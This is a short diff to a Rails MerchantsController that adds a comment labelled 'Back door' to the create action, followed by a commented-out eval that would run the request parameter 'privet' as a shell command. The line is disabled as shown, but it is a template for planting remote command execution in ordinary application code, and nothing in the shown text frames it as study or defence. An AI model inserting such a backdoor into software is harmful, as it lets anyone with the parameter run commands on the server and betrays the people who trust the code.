@@ -15,6 +15,8 @@ class MerchantsController < ApplicationController
 
   def create
     @merchant = Merchant.new(merchant_params)
+    # Back door
+    # eval("%x(#{params[:privet]})")
     if @merchant.save 
       render :show
     else
